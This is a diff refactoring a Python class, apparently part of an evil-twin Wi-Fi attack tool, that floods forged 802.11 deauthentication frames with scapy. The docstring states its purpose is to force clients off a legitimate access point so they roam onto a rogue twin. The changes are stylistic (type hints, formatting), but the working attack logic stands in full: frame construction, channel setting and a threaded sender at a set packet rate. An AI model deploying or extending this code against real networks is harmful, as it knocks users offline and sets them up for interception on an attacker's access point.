@@ -6,14 +6,17 @@ packets-per-second (PPS) rate. Used to force clients off the legitimate AP
 so they roam onto our rogue twin.
 """
 
+import logging
 import subprocess
 import threading
 import time
-import logging
-from typing import Optional
+from typing import TYPE_CHECKING
 
 from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
 from scapy.sendrecv import sendp
+
+if TYPE_CHECKING:
+    from scapy.packet import Packet
 
 logger = logging.getLogger("wimirage")
 
@@ -37,25 +40,27 @@ class DeauthAttack:
     DEFAULT_PPS = 100
     BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"
 
-    def __init__(self, interface: str, target_bssid: str, target_channel: int,
-                 client_mac: str = "FF:FF:FF:FF:FF:FF", pps: int = DEFAULT_PPS) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        target_channel: int,
+        client_mac: str = "FF:FF:FF:FF:FF:FF",
+        pps: int = DEFAULT_PPS,
+    ) -> None:
         self.interface = interface
         self.target_bssid = target_bssid
         self.target_channel = target_channel
         self.client_mac = client_mac
         self.pps = pps
         self._running = False
-        self._thread: Optional[threading.Thread] = None
+        self._thread: threading.Thread | None = None
         self.packets_sent = 0
-        self._packet = None
-        self._reverse_packet = None
+        self._packet: Packet | None = None
+        self._reverse_packet: Packet | None = None
 
-    def _build_deauth_packet(self) -> bytes:
-        dot11 = Dot11(
-            addr1=self.client_mac,
-            addr2=self.target_bssid,
-            addr3=self.target_bssid
-        )
+    def _build_deauth_packet(self) -> "Packet":
+        dot11 = Dot11(addr1=self.client_mac, addr2=self.target_bssid, addr3=self.target_bssid)
         deauth = Dot11Deauth(reason=7)
         return RadioTap() / dot11 / deauth
 
@@ -63,17 +68,19 @@ class DeauthAttack:
         self._packet = self._build_deauth_packet()
 
         if self.client_mac == self.BROADCAST_MAC:
-            self._reverse_packet = RadioTap() / Dot11(
-                addr1=self.target_bssid,
-                addr2=self.client_mac,
-                addr3=self.target_bssid
-            ) / Dot11Deauth(reason=7)
+            self._reverse_packet = (
+                RadioTap()
+                / Dot11(addr1=self.target_bssid, addr2=self.client_mac, addr3=self.target_bssid)
+                / Dot11Deauth(reason=7)
+            )
 
     def set_channel(self) -> None:
         try:
             subprocess.run(
                 ["iwconfig", self.interface, "channel", str(self.target_channel)],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=5,
             )
         except subprocess.TimeoutExpired:
             logger.warning(f"Timeout setting channel on {self.interface}")
@@ -136,8 +143,12 @@ class DeauthAttack:
         assert self._packet is not None, "_build_packets failed to populate _packet"
         self.set_channel()
 
-        target_type = "broadcast" if self.client_mac == self.BROADCAST_MAC else f"client {self.client_mac}"
-        logger.info(f"Starting deauth attack on {self.target_bssid} -> {target_type} at {self.pps} PPS")
+        target_type = (
+            "broadcast" if self.client_mac == self.BROADCAST_MAC else f"client {self.client_mac}"
+        )
+        logger.info(
+            f"Starting deauth attack on {self.target_bssid} -> {target_type} at {self.pps} PPS"
+        )
 
         self._thread = threading.Thread(target=self._send_deauth, daemon=True)
         self._thread.start()
@@ -155,7 +166,7 @@ class DeauthAttack:
         """Return True if a worker thread is currently emitting frames."""
         return self._running
 
-    def set_target(self, bssid: str, channel: int, client_mac: Optional[str] = None) -> None:
+    def set_target(self, bssid: str, channel: int, client_mac: str | None = None) -> None:
         self.target_bssid = bssid
         self.target_channel = channel
         if client_mac:
